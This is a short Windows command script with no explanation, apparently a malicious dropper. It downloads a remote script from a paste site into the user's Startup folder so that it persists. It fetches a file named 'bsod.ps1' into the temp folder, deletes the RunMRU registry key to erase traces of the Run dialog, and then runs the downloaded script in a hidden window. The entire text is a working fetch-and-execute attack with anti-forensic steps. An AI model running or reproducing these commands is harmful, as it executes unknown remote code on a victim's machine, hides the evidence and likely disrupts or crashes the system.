powershell.exe Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup && powershell.exe iwr https://textbin.net/raw/mhfpjhlreq -outfile start.cmd
cd %temp% && powershell.exe iwr https://textbin.net/raw/i4xpbrunl9 -outfile bsod.ps1
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
cd %temp% && powershell.exe -WindowStyle Hidden -File .\bsod.ps1
